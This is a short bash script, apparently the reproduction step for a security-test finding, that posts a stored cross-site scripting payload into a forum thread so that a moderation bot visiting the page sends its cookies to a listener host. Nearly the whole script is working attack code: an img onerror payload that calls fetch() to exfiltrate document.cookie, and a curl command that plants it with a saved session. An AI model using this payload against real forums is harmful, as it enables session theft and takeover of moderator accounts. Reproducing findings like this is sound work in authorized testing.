#!/usr/bin/env bash
# Finding 05: post stored-XSS payload to a forum thread to steal the
# moderation bot's cookies.
# Usage: ./repro-05-post-payload.sh <base_url> <thread_id> <listener_host:port> <cookie_jar>
set -euo pipefail
BASE="${1:-http://192.168.1.74:4942}"
THREAD="${2:-bbeo32ucx0a65b8}"
LISTENER="${3:-192.168.1.63:8888}"
JAR="${4:-cookies_jdoe.txt}"

PAYLOAD="<img src=x onerror=\"fetch('http://${LISTENER}/xss-hit?c='+encodeURIComponent(document.cookie))\">"

echo "[*] Posting payload to $BASE/forum/$THREAD/comment"
curl -s -b "$JAR" -X POST "$BASE/forum/$THREAD/comment" \
  --data-urlencode "content=$PAYLOAD" -o /dev/null -w "status=%{http_code}\n"

echo "[*] Waiting for the moderation bot to visit the thread..."
echo "[*] Check your listener's hits.log for a hit from $BASE's host."
